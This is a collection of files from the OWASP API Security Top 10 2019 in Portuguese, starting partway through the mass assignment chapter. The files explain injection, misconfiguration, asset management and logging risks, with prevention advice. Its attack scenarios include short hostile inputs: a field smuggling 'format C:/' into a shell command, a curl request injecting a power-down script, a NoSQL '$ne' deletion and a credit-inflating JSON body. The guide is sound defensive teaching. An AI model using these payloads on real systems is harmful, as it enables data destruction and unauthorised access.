**Propriedades internas**: `article.created_time` deve ser modificada apenas\n  internamente pela aplicação.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma aplicação de partilha de transporte tem ao dispor do utilizador uma opção\npara editar informações básicas para o seu perfil. Durante este processo, um\npedido à API é enviado para `PUT /api/v1/users/me` com o seguinte objeto JSON\nlegítimo:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\n\nO pedido `GET /api/v1/users/me` incluí uma propriedade `credit_balance`\nadicional:\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nO atacante envia novamente o primeiro pedido com o seguinte conteúdo:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nDado que o _endpoint_ é vulnerável a mass assignment, o atacante recebe crédito\nsem ter efetuado qualquer pagamento.\n\n### Cenário #2\n\nUm portal de partilha de vídeo permite carregar e descarregar conteúdo em\ndiferentes formatos. Um atacante que investigou a API descobriu que o _endpoint_\n`GET /api/v1/videos/{video_id}/meta_data` devolve um objeto JSON com as\npropriedades do vídeo. Uma das propriedades é\n`\"mp4_conversion_params\":\"-v codec h264\"`, que revela que a aplicação utiliza um\ncomando _shell_ para converter o vídeo.\n\nO atacante também descobriu o _endpoint_ `POST /api/v1/videos/new` que é\nvulnerável a Mass Assignment, permitindo ao cliente modificar qualquer\npropriedade do objeto. O atacante atribui um valor malicioso como o seguinte:\n`\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. Este valor vai causar\numa injeção de um comando _shell_ assim que o atacante descarregar o vídeo no\nformato MP4.\n\n## Como Prevenir\n\n* Se possível, evitar usar funções que convertem automaticamente parâmetros do\n  cliente em variáveis de código ou objetos internos.\n* Ter uma lista onde constam apenas os nomes das propriedades que o cliente pode\n  atualizar.\n* Usar funcionalidades já existentes para ter uma lista de propriedades que não\n  devem ser acedidas por clientes.\n* Se possível, definir explicitamente e forçar a utilização de _schemas_ para o\n  conteúdo dos pedidos.\n\n## Referências\n\n### Externas\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object\n  Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:43.485325"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa7-security-misconfiguration.md", "content": "# API7:2019 Security Misconfiguration\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **3** | Prevalência **3** : Deteção **3** | Técnico **2** : Específico Negócio |\n| Os atacantes vão regra geral tentar encontrar falhas, _endpoints_ comuns ou ficheiros e diretórios desprotegidos para ganhar acesso não autorizado ou conhecimento do sistema. | Falhas nas configurações de segurança podem acontecer em qualquer camada da API, desde o nível de rede ao aplicacional. Existem ferramentas automáticas para detetar e abusar destas falhas, tais como serviços desnecessários que se encontram em execução ou configurações antigas. | Estas falhas podem não só expor dados sensíveis dos utilizadores, mas também detalhes do sistema que permitam comprometer o servidor. |\n\n## A API é vulnerável?\n\nA API é vulnerável se:\n\n* As configurações para proteger o sistema estão em falta em qualquer das partes\n  constituintes da API, ou se existem serviços na nuvem indevidamente\n  configurados.\n* As últimas atualizações de segurança não foram aplicadas ou os sistemas estão\n  desatualizados.\n* Existem funcionalidades ativas que não estão em uso (e.g., verbos HTTP).\n* A segurança do canal de comunicação não está assegurada: _Transport Layer\n  Security_ (TLS) em falta ou indevidamente configurado.\n* Diretivas de segurança não são enviadas aos clientes (e.g.,\n  [cabeçalhos HTTP de segurança][1]).\n* Não existe um política de Partilha de Recursos entre Origens (CORS) ou esta\n  está indevidamente configurada.\n* As mensagens de erro incluem _stack traces_ ou outra informação sensível.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUm atacante encontra o ficheiro `.bash_history` na diretoria raiz do servidor, o\nqual contém os comandos usados pela equipa de DevOps para aceder à API:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\nO atacante pôde assim identificar novos _endpoints_ da API, destinados\nexclusivamente ao uso pela equipa de DevOps e que não estavam documentados.\n\n### Cenário #2\n\nTendo em vista um serviço específico, um atacante usa um conhecido motor de\nbusca de dispositivos diretamente acessíveis através da internet. O atacante\nencontrou um _host_ a correr um conhecido sistema de gestão de base de dados, à\nescuta na porta padrão. Como o _host_ estava a utilizar a configuração padrão, a\nqual tem o mecanismo de autenticação desativado por omissão, o atacante teve\nacesso a milhões de registo com informação pessoal (PII), preferências e dados\nde autenticação dos utilizadores.\n\n### Cenário #3\n\nInspecionando o tráfego de rede duma aplicação móvel, um atacante percebe que\nnem todo o tráfego usa um protocolo seguro (e.g., TLS), em particular aquele\nassociado às imagens de perfil de utilizador. Como as interações do utilizador\nna aplicação são binárias, apesar do tráfego da API ser enviado de forma segura,\no atacante identifica um padrão no tamanho das respostas da API, o qual usa para\nmapear as preferências do utilizador em relação ao conteúdo visualizado (e.g.,\nimagens de perfil).\n\n## Como Prevenir\n\nO ciclo de vida da API deve incluir:\n\n* Um processo de proteção reprodutível que possa ser implantado de forma fácil\n  e rápida com vista a um ambiente de execução devidamente protegido.\n* Um processo de revisão e atualização de todas as camadas da API. A revisão\n  deve incluir: ficheiros de orquestração, componentes da API e serviços na\n  nuvem (e.g., permissões dos _buckets_ S3).\n* Um canal de comunicação seguro para todas as interações da API no acesso a\n  recursos estáticos (e.g., imagens).\n* Um processo automatizado para verificar de forma continua as configurações e\n  definições em todos os ambientes (produção, _staging_, testes,\n  desenvolvimento).\n\nE ainda:\n\n* Para prevenir que _stack traces_ sejam incluídas nas mensagens de erro ou\n  outra informação sensível seja fornecida aos atacantes, quando aplicável,\n  defina _schemas_ e verifique que todas as respostas da API estão em\n  conformidade.\n* Assegure que a API só é acessível através do verbos HTTP especificados. Todos\n  os demais verbos HTTP que não são utilizados deverão estar desativados (e.g.,\n  `HEAD`).\n* As APIs destinadas a acessos por clientes a correr em navegadores (e.g.,\n  WebApps) devem implementar uma política de Partilha de Recursos Entre Origens\n  (CORS) adequada.\n\n## Referências\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration and Deployment Management][2]\n* [OWASP Testing Guide: Testing for Error Handling][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### Externas\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://owasp.org/www-project-secure-headers/\n[2]: https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing\n[3]: https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client_Side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md\n", "timestamp": "2025-10-24T22:26:43.600354"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa8-injection.md", "content": "# API8:2019 Injection\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **3** | Prevalência **2** : Deteção **3** | Técnico **3** : Específico Negócio |\n| Os atacantes fornecem à API dados maliciosos através dos vetores de injeção disponíveis (e.g., formulários, parâmetros, integrações, etc.), na expetativa que estes sejam enviados a um interpretador. | Falhas de injeção são bastante comuns e são geralmente encontradas em consultas SQL, LDAP ou NoSQL, comandos enviados ao sistema operativo, _parsers_ XML e ORM. Estas falhas são fáceis de identificar durante a revisão do código. Os atacantes podem fazer uso de _scanners_ e _fuzzers_. | As injeções podem conduzir à divulgação de informação e perda de dados. Podem ainda conduzir à negação de serviço (DoS) ou à tomada de controlo do _host_. |\n\n## A API é vulnerável?\n\nA API é vulnerável se:\n\n* Dados fornecidos pelo cliente não são validados, filtrados ou sanitizados pela\n  API.\n* Dados fornecidos pelo cliente são concatenados diretamente em consultas\n  SQL/NoSQL/LDAP, comandos a enviar ao sistema operativo, _parsers_ XML e\n  _Object Relational Mapping_ (ORM)/_Object Document Mapper_ (ODM).\n* Dados com origem em sistemas externos (e.g., sistemas integrados) não são\n  validados, filtrados ou sanitizados pela API.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nO _firmware_ dum dispositivo de controlo parental implementa o _endpoint_\n`/api/CONFIG/restore`, o qual espera que lhe seja enviado uma parâmetro `appId`\nno formato `multipart`. Com recurso a um descompilador, um atacante descobre que\no parâmetro `appId` é passado diretamente numa chamada ao sistema sem qualquer\ntipo de sanitização:\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nO comando abaixo permite ao atacante desligar qualquer equipamento que corra o\nmesmo _firmware_ vulnerável:\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### Cenário #2\n\nPerante uma aplicação de reservas com funcionalidades de criação, consulta,\natualização e remoção, um atacante desconfia que talvez seja possível realizar\ninjeções NoSQL através do parâmetro `bookingId` presente na _query string_ dos\npedidos de remoção. Este é o aspeto do pedido:\n`DELETE /api/bookings?bookingId=678`.\n\nEsta é a função usada pelo servidor da API para atender tais pedidos:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nO atacante interceta o pedido e altera o parâmetro `bookingId` na\n_query string_, conforme apresentado abaixo. Neste caso o atacante consegue\napagar a reserva doutro utilizador.\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## Como Prevenir\n\nA prevenção de injeções exige que os dados sejam separados dos comandos e\nconsultas.\n\n* Usar uma única biblioteca para validação de dados que seja confiável e\n  ativamente mantida.\n* Validar, filtrar e sanitizar todos os dados fornecidos pelo cliente ou outros\n  dados provenientes de sistemas integrados.\n* Caracteres especiais devem ser neutralizados com recurso à sintaxe específica\n  do interpretador para onde serão enviados.\n* Opte por APIs de consulta seguras que oferecem interfaces parametrizadas.\n* Limite sempre o número de registos a devolver por forma a prevenir a\n  divulgação massiva de dados em caso de injeção.\n* Valide os dados de entrada usando os filtros necessários para apenas permitir\n  valores válidos para cada parâmetro.\n* Defina tipos de dados e padrões bem definidos para todos os parâmetros\n  textuais.\n\n## Referências\n\n### OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### External\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://owasp.org/www-community/Injection_Flaws\n[2]: https://owasp.org/www-community/attacks/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://owasp.org/www-community/attacks/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:43.706310"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa9-improper-assets-management.md", "content": "# API9:2019 Improper Assets Management\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **3** | Prevalência **3** : Deteção **2** | Técnico **2** : Específico Negócio |\n| Versões antigas da API tipicamente não são alvo de atualizações e podem ser usadas para comprometer sistemas sem ter que lidar com mecanismos de segurança mais avançados, os quais poderão estar ativos nas versões mais recentes. | A documentação desatualizada dificulta a identificação e/ou correção de falhas de segurança. A inexistência dum inventário e duma estratégica de descontinuação estão na génese dos sistemas sem atualizações de segurança que acabam por divulgar informação sensível. É comum encontrar-se APIs expostas desnecessariamente: o conceito de micro-serviços tornou o _deploy_ das aplicações mais fácil e independente (e.g., _cloud_, kubernetes), podendo estar na origem deste fenómeno. | Os atacantes podem conseguir acesso a informação sensível ou até obter o controlo do servidor através de versões antigas e sem atualizações de segurança que estejam ligadas à mesma base de dados. |\n\n## A API é vulnerável?\n\nA API pode ser vulnerável se:\n\n* O propósito dum host da API não é claro, não havendo respostas explicitas para\n  as seguintes perguntas:\n    * Em que ambientes está a API a correr (e.g., produção, _staging_, testes,\n      desenvolvimento)?\n    * Quem deve ter acesso à API através da rede (e.g., público, interno,\n      parceiros)?\n    * Que versões da API estão a correr?\n    * Que informação é recolhida e processada pela API (e.g., PII)?\n    * Qual é o fluxo dos dados?\n* Não existe documentação, ou a que existe não está atualizada.\n* Não existe um plano para descontinuar cada uma das versões da API.\n* Não existe um inventário de hosts ou o que existe está desatualizado.\n* O inventário de integração de serviços, próprios ou de terceiros, não existe\n  ou está desatualizado.\n* Versões antigas ou anteriores estão a correr sem atualizações de segurança.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nDepois de redesenhar as suas aplicações, um serviço de pesquisa local deixou\numa versão antiga da API a correr (`api.someservice.com/v1`), desprotegida e com\nacesso à base de dados de utilizadores. Enquanto estava a analisar uma das\núltimas versões das aplicações, um atacante encontrou o endereço da API\n(`api.someservice.com/v2`). Substituindo `v2` por `v1` no URL, o atacante\nconseguiu acesso à versão antiga da API a qual expunha informação pessoal (PII)\nde mais de 100 milhões de utilizadores.\n\n### Cenário #2\n\nUma rede social implementou um mecanismo de limitação do número de pedidos para\nimpedir os atacantes de usar ataques de força bruta para adivinhar os _tokens_\nde redefinição de password. Este mecanismo não foi implementado ao nível do\ncódigo da API, mas sim como um componente entre o cliente e a API em uso. Um\ninvestigador encontrou um _host_ relativo à versão beta da API mas que corria\nagora a última versão desta, incluindo o mecanismo de redefinição da password,\nmas aqui sem o mecanismo de limitação do número de pedidos. O investigador seria\ncapaz de redefinir a password de qualquer utilizador, recorrendo a força bruta\npara adivinhar o _token_ de 6 dígitos.\n\n## Como Prevenir\n\n* Inventarie todos os _hosts_ da API e documente os aspetos importantes de cada\n  um deles, com especial enfoque no ambiente da API (e.g., produção, _staging_,\n  testes, desenvolvimento), quem deve ter acesso pela rede ao _host_ (e.g.,\n  público, interno, parceiros) e a versão da API.\n* Inventarie as integrações de serviços e documente os aspetos mais importantes\n  tais como o papel destes no sistema, que dados são trocados (fluxo de dados) e\n  a sua suscetibilidade.\n* Documente todos os aspetos da API, tais como autenticação, erros,\n  redirecionamentos, política de limitação do número de pedidos, polícia de\n  Partilha de Recursos Entre Origens (CORS) e _endpoints_, incluindo os seus\n  parâmetros, pedidos e respostas.\n* Gere a documentação de forma automática através da adoção de standards. Inclua\n  a geração da documentação no seu processo de CI/CD.\n* Torne a documentação da API disponível para aqueles autorizados a consultá-la.\n* Utilize mecanismos de proteção externa, tais como _API Security Firewalls_, em\n  todas as versões da API expostas e não exclusivamente a versão mais recente em\n  produção.\n* Evite a utilização de dados de produção em outros ambientes da API que não de\n  produção. Se não puder evitá-lo, esses ambientes/versões/_endpoints_ deverão\n  ter o mesmo nível de segurança do que os de produção.\n* Quando as novas versões da API incluem melhorias de segurança, realize a\n  análise de risco para uma melhor tomada de decisão quanto às ações necessárias\n  para a migração das versões antigas: por exemplo, se é possível aplicar as\n  mesmas melhorias às versões anteriores sem quebrar compatibilidade ou se as\n  deve retirar o quanto antes, forçando os clientes a migrar para a última\n  versão.\n\n## Referências\n\n### Externas\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:43.830351"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Insufficient Logging & Monitoring\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **2** | Prevalência **3** : Deteção **1** | Técnico **2** : Específico Negócio |\n| Os atacantes podem tirar partido desta vulnerabilidade para abusar dos sistemas sem ser detetados. | Sem registo de eventos e monitorização, ou com um registo e monitorização insuficientes, é quase impossível detetar atividades suspeitas e responder às mesmas em tempo útil. | Sem visibilidade sobre atividades maliciosas os atacantes têm tempo suficiente para comprometer os sistemas. |\n\n## A API é vulnerável?\n\nA API é vulnerável se:\n\n* Não regista qualquer evento, o tipo de evento registado não é o correto ou os\n  registos não incluem detalhe suficiente.\n* A integridade do registo de eventos não é assegurada (e.g.,\n  [Log Injection][1]).\n* Os registos de eventos não são monitorizados.\n* A infraestrutura da API não é monitorizada ininterruptamente.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nAs _access keys_ duma API de administração foram expostas publicamente num\nrepositório. O proprietário do repositório foi notificado por email sobre a\npotencial divulgação das chaves mas demorou mais de 48h a reagir ao incidente e\na exposição das chaves pode ter permitido o acesso a informação sensível. Devido\nao registo de eventos insuficiente, a empresa não foi capaz de averiguar que\ninformação havia sido acedida por agentes mal intencionados.\n\n### Cenário #2\n\nUma plataforma de partilha de vídeo foi alvo um ataque de _credendial stuffing_\nem larga escala. Apesar das tentativas de autenticação falhadas serem constarem\ndo registo de eventos, nenhum alerta foi gerado durante o tempo que o ataque\ndecorreu. Em reação às queixas dos utilizadores os registos de eventos da API\nforam analisados e o ataque foi identificado. A empresa teve que emitir um\ncomunicado público a pedir aos utilizadores para alterar as suas _passwords_ e\ncomunicar o incidente às autoridades reguladores.\n\n## Como Prevenir\n\n* Registe todas as tentativas de autenticação falhadas, controlo de acesso\n  negados e falhas na validação de dados fornecidos pelo utilizador.\n* Os registos de eventos devem usar um formato que permita serem processados por\n  ferramentas de gestão de registos e devem incluir detalhe suficiente para\n  identificar os agentes maliciosos.\n* Os registos de eventos deve ser tratados como informação sensível e a sua\n  integridade deve ser assegurada tanto em repouso como em trânsito.\n* Configure um sistema de monitorização para a infraestrutura, rede e API.\n* Utilize um Sistema de Gestão e Correlação de Eventos de Segurança (SIEM) para\n  agregar e gerir os registos de eventos de todos os componentes da API e\n  _hosts_.\n* Configure visualizações personalizadas sobre os alertas, permitindo que\n  atividade suspeita seja detetada e endereçada o mais cedo possível.\n\n## Referências\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### Externas\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://owasp.org/www-community/attacks/Log_Injection\n[2]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Logging_Cheat_Sheet.md\n[3]: https://owasp.org/www-project-proactive-controls/\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:43.981453"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xb0-next-devs.md", "content": "# O Que Se Segue Para Programadores\n\nA tarefa de criar e manter software seguro, ou corrigir software existente, pode\nser difícil. O mesmo se verifica em relação às APIs.\n\nAcreditamos que educação e consciencialização são fatores chave para o\ndesenvolvimento de software seguro. Tudo o mais necessário para alcançar este\nobjetivo depende da **definição e utilização de processos de segurança\nreprodutíveis e do uso de controlos de segurança _standard_**.\n\nA OWASP disponibiliza uma grande quantidade de recursos gratuitos e abertos para\nabordar a segurança desde o início dum projeto. Por favor visite a [página dos\nprojetos OWASP][1] para consulta da lista dos projetos existentes.\n\n| | |\n|-|-|\n| **Educação** | Pode começar por ler os conteúdos disponibilizados pelos [projetos na categoria OWASP Education][2] de acordo com a sua profissão e interesse. Para uma abordagem mais prática, adicionámos ao nosso plano de trabalho o projeto **crAPI** - **C**ompletely **R**idiculous **API** (API Completamente Ridícula). Enquanto isso, pode praticar segurança de aplicações web usando o [Módulo OWASP DevSlop Pixi][4]: uma WebApp e API intencionalmente vulneráveis com o objetivo de ensinar aos utilizadores como testar a segurança de WebApps modernas e APIs e como desenvolver APIs mais seguras. Poderá também participar nas sessões de treino das [conferências OWASP AppSec][5] ou [juntar-se ao seu grupo OWASP local][6]. |\n| **Requisitos de Segurança** | A segurança deve fazer parte de qualquer projeto desde o início. É importante que, durante a fase de identificação de requisitos, seja definido o que é que “seguro” significa no contexto desse projeto. A OWASP recomenda a utilização do [OWASP Application Security Verification Standard (ASVS)][7] como guia para definir os requisitos de segurança. Se estiver a subcontratar, considere ao invés a utilização do [OWASP Secure Software Contract Annex][8], o qual deverá adaptar às leis e regulamentações locais. |\n| **Arquitetura de Segurança** | A segurança deve ser uma preocupação durante todas as fases dum projeto. O projeto [OWASP Prevention Cheat Sheets][9] é um bom ponto inicial de orientação sobre como contemplar a segurança durante a fase de arquitetura. Entre outros, o [REST Security Cheat Sheet][10] e o [REST Assessment Cheat Sheet][11] serão seguramente relevantes. |\n| **Controlos Standard de Segurança** | A adoção de controlos standard de segurança reduzem o risco de introdução de falhas de segurança durante a implementação da lógica de negócio. Apesar de muitas _frameworks_ modernas já incluírem controlos _standards_, o projeto [OWASP Proactive Controls][12] dá-lhe uma visão sobre que controlos de segurança deve incluir no seu projeto. A OWASP também disponibiliza algumas bibliotecas e ferramentas que pode achar úteis, tais como controlos de validação. |\n| **Ciclo de Desenvolvimento de Software Seguro** | Pode usar o [OWASP Software Assurance Maturity Model (SAMM)][13] para melhorar o processo de desenvolvimento de APIs. Tem ainda disponíveis vários outros projetos OWASP para o ajudar durante as várias fases de desenvolvimento de APIs, por exemplo o [OWASP Code Review Project][14]. |\n\n[1]: https://owasp.org/projects/\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://owasp.org/events/#global-events\n[6]: https://owasp.org/chapters/\n[7]: https://owasp.org/www-project-application-security-verification-standard/\n[8]: https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex\n[9]: https://owasp.org/www-project-cheat-sheets/\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://owasp.org/www-project-proactive-controls/\n[13]: https://owasp.org/www-project-samm/\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:44.091489"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xb1-next-devsecops.md", "content": "# O que Se Segue Para DevSecOps\n\nDada a sua importância na arquitetura das aplicações modernas, desenvolver APIs\nseguras é crucial. A segurança não pode ser negligenciada e deve estar presente\ndurante todo o clico de vida do desenvolvimento. Já não basta a execução de\n_scanners_ ou a realização de testes de penetração anualmente.\n\nA equipa de DevSecOps deve fazer parte do esforço de desenvolvimento\ncontribuindo para a realização de testes de segurança, de forma continuada,\ndurante todo o ciclo de vida do desenvolvimento. Deve ter como objetivo melhorar\na _pipeline_ de desenvolvimento com automação de segurança e sem influenciar\nnegativamente no ritmo do desenvolvimento.\n\nEm caso de dúvida mantenha-se informado e reveja o [Manifesto DevSecOps][1] com\nfrequência.\n\n\n\n| | |\n|-|-|\n| **Compreenda o Modelo de Ameaças** | As prioridades relativamente ao que deve ser testado têm origem no modelo de ameaças. Se não tem um, considere usar o [OWASP Application Security Verification Standard (ASVS)][2] e o [OWASP Testing Guide][3] como base. Envolver a equipa de desenvolvimento na elaboração do modelo de ameaças pode torná-la mais consciente para questões relacionadas com segurança. |\n| **Compreenda o Ciclo de Vida do Desenvolvimento do Software** | Reúna a equipa de desenvolvimento para melhor compreender o ciclo de vida do desenvolvimento do software. O seu contributo para a realização continua de testes de segurança deve ser compatível com as pessoas, processos e ferramentas. Todos devem concordar com o processo, de forma a não provocar atrito ou resistência desnecessários. |\n| **Estratégias de Teste** | Sendo que o seu trabalho não deve condicionar o ritmo de desenvolvimento, deverá escolher cuidadosamente a melhor (mais simples, rápida e precisa) técnica para verificar os requisitos de segurança. A [OWASP Security Knowledge Framework][4] e o [OWASP Application Security Verification Standard][5] podem ser importantes fontes de requisitos de segurança funcionais e não-funcionais. Existem outras fontes relevantes onde poderá encontrar [projetos][6] e [ferramentas][7] como aquelas disponibilizadas pela [comunidade DevSecOps][8]. |\n| **Procure Alcançar Cobertura e Precisão** | Você é a ponte entre as equipas de desenvolvimento e operações. Para alcançar cobertura, deve não só focar-se na funcionalidade, mas também na orquestração. Trabalhe junto de ambas as equipas desde o início por forma a otimizar o seu tempo e esforço. Deve almejar um estado em que o essencial da segurança é verificado de forma continua. |\n| **Comunique as Falhas de Forma Clara** | Entregue valor evitando qualquer atrito. Comunique as falhas identificadas atempadamente, usando as ferramentas que a equipa de desenvolvimento já utiliza (e não através de ficheiros PDF). Junte-se à equipa de desenvolvimento para resolver as falhas identificadas. Aproveite a oportunidade para educar os elementos da equipa de desenvolvimento, descrevendo de forma clara a falha e como esta pode ser abusada, incluindo um cenário de ataque para a tornar mais real. |\n\n[1]: https://www.devsecops.org/\n[2]: https://owasp.org/www-project-application-security-verification-standard/\n[3]: https://owasp.org/www-project-web-security-testing-guide/\n[4]: https://owasp.org/www-project-security-knowledge-framework/\n[5]: https://owasp.org/www-project-application-security-verification-standard/\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:44.196770"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xd0-about-data.md", "content": "# Metodologia e Dados\n\n## Preâmbulo\n\nUma vez que a indústria de segurança aplicacional não tem estado focada\nespecificamente nas arquiteturas aplicacionais mais recentes, nas quais as APIs\ntêm um papel importante, compilar a lista dos riscos de segurança mais críticos\npara APIs com base numa consulta pública de dados teria sido uma tarefa árdua.\nApesar desta consulta pública de dados não ter sido feita, a lista atual é ainda\nresultado de informação que se encontra disponível publicamente, assim como de\ncontribuições de especialista em segurança e da discussão aberta à comunidade de\nsegurança.\n\n## Metodologia e Dados\n\nNuma primeira fase um grupo de especialistas em segurança recolheu, reviu e\ncategorizou informação relativa a incidentes relacionados com APIs que se\nencontrava disponível publicamente. Esta informação foi recolhida de plataformas\nde _bug bounty_ e bases de dados de falhas de segurança, restringida a\nincidentes ocorridos no último ano. Esta informação foi usada para fins\nestatísticos.\n\nNa fase seguinte, foi pedido a um grupo de profissionais de segurança com\nexperiência em testes de penetração que criassem a seu próprio Top 10.\n\nA [Metodologia de Classificação de Risco da OWASP][1] foi usada para realizar a\nanálise de risco e as classificações foram discutidas e revistas entre os\nprofissionais de segurança. Para mais informação sobre este assunto consulte a\nsecção [Riscos de Segurança em APIs][2].\n\nO primeiro rascunho do OWASP API Security Top 10 2019 resultou do consenso entre\nos dados estatísticos da primeira fase e as listas compiladas pelos\nprofissionais de segurança. Este rascunho foi depois submetido à apreciação e\nrevisão por outro grupo de profissionais de segurança com experiência relevante\nem segurança de APIs.\n\nO OWASP API Security Top 10 2019 foi apresentado publicamente pela primeira vez\nna conferência OWASP Global AppSec Tel Aviv (Maio 2019). Desde então ele tem\nestado disponível no GitHub para discussão e contribuições.\n\nA lista de todos os que contribuíram para esta versão encontra-se na secção\n[Agradecimentos][3].\n\n[1]: https://owasp.org/www-project-risk-assessment-framework/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:44.306517"}
